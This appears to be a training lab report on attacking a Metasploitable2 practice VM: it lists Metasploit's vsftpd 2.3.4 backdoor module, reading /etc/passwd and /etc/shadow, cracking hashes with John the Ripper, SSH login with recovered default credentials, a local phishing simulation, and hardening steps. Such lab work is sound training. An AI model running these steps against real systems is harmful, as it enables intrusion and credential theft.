# Task 4 - Initial Setup Report

## Environment Details

### Lab Configuration

**Attacker Machine (Kali Linux):**
- IP Address:192.168.56.101

**Target Machine (Metasploitable2):**
- IP Address: 192.168.56.102

### Tools Verified
- [x] Metasploit Framework
- [x] Nmap
- [x] Hydra
- [x] John the Ripper
- [x] Flameshot (screenshots)
- [x] Netcat

### Network Connectivity
- Ping test: Success ✓
- Port scan: Success ✓

### Directory Structure Created
---

## Step 2: Exploitation with Metasploit

### Step 2.1 - Started Metasploit

**Command Used:**
```bash
msfconsole
```

**Result:**
Metasploit Framework started successfully and loaded into `msf6 >` prompt.

**Status:** Success ✓
### Step 2.2 - Service Enumeration

**Command Used:**
```bash
nmap -sV TARGET_IP
```

**Result:**
Successfully identified running services and versions on Metasploitable2.

**Interesting Services Found:**
- FTP
- SSH
- Telnet
- HTTP

**Status:** Success ✓
### Step 2.3 - Exploited vsftpd 2.3.4

**Commands Used:**
```bash
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS TARGET_IP
run
```

**Result:**
Successfully exploited vulnerable FTP service (vsftpd 2.3.4) and gained shell access to Metasploitable2.

**Verification Commands:**
```bash
whoami
hostname
pwd
```

**Status:** Success ✓
### Step 2.4 - Post Exploitation

**Commands Used:**
```bash
sysinfo
getuid
shell
cat /etc/passwd
cat /etc/shadow
```

**Result:**
Successfully gathered system information and accessed Linux user account information after exploitation.

**Observation:**
`hashdump` was not supported for Linux Meterpreter, so `/etc/passwd` and `/etc/shadow` were used as Linux alternatives.

**Status:** Success ✓
### Step 2.5 - Password Cracking with John the Ripper

**Commands Used:**
```bash
john hashes.txt
john --show hashes.txt
```

**Cracked Credentials:**
- postgres : postgres
- user : user
- msfadmin : msfadmin
- service : service
- klog : 123456789
- sys : batman

**Result:**
Successfully cracked password hashes extracted from the Linux target.

**Status:** Success ✓
### Step 3 - Password Attacks (SSH Access)

**Objective:** Demonstrate SSH authentication against Metasploitable2.

**Commands Used:**
```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oMACs=hmac-sha1 msfadmin@192.168.56.102
whoami
hostname
```

**Verified Credentials:**
- Username: msfadmin
- Password: msfadmin

**Result:**
Successfully authenticated to Metasploitable2 through SSH and verified access.

**Verification Output:**
- whoami → msfadmin
- hostname → metasploitable

**Status:** Success ✓
### Step 4 - Social Engineering (Simulation Only)

**Objective:** Demonstrate phishing awareness using a simulated login page.

**Files Created:**
- phishing_simulation.html
- phishing_awareness.md

**Activity Performed:**
Created a phishing simulation login page locally to understand how attackers imitate legitimate login portals.

**Awareness Training Covered:**
- Suspicious URLs
- Poor grammar/spelling
- Fake login pages
- Urgent credential requests
- Suspicious links and attachments

**Prevention Measures:**
- Verify website URLs
- Use MFA
- Avoid suspicious links
- Never share passwords
- Report phishing attempts

**Result:**
Successfully created and tested a phishing awareness simulation page locally.

**Status:** Success ✓
### Step 6 - System Hardening

**Objective:** Improve system security through updates, firewall, and service management.

### Commands Used
```bash
sudo apt update
sudo apt upgrade -y
sudo ufw enable
sudo ufw allow ssh
sudo ufw status
systemctl list-units --type=service --state=running
ss -tulnp
```

### Actions Performed
- Updated system packages
- Enabled firewall
- Allowed SSH through firewall
- Reviewed running services
- Inspected open network ports

### Security Improvements
- Reduced attack surface
- Improved patch level
- Better network control

**Status:** Success ✓
